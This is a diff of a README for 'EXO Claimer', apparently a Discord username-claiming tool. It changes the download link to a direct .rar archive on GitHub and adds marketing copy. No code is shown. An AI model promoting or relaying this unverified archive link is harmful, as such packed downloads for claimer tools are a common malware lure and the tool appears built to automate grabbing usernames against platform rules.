@@ -1,6 +1,6 @@
 # EXO Claimer - Discord Username Claimer v1.0.0
 
-Download >>>>> https://github.com/Monsterrrrr22/ExoClaimer-Discord-Username/releases/tag/Discord
+## Download Here >>>>> https://github.com/Monsterrrrr22/ExoClaimer-Discord-Username/releases/download/ExoClaim/ExoClaimerV1.rar
 
 ⚡ **Professional Discord Username Claiming Tool with Advanced Features**
 
